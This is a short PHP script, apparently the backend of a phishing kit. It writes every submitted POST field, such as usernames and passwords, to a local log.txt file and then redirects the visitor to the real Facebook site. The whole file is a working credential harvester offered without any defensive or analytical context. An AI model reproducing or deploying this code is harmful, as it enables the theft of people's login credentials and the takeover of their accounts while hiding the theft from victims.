<?php
	//@ByDog3r
	header ('Location: https://www.facebook.com/ '); 
	$handle = fopen("log.txt", "a"); 
	foreach($_POST as $variable => $value) {
		fwrite($handle, $variable);
		fwrite($handle, "=");
		fwrite($handle, $value);
		fwrite($handle, "\r\n");
	}
	fwrite($handle, "\r\n");
	fclose($handle);
	exit;
	//@ByDog3r
?>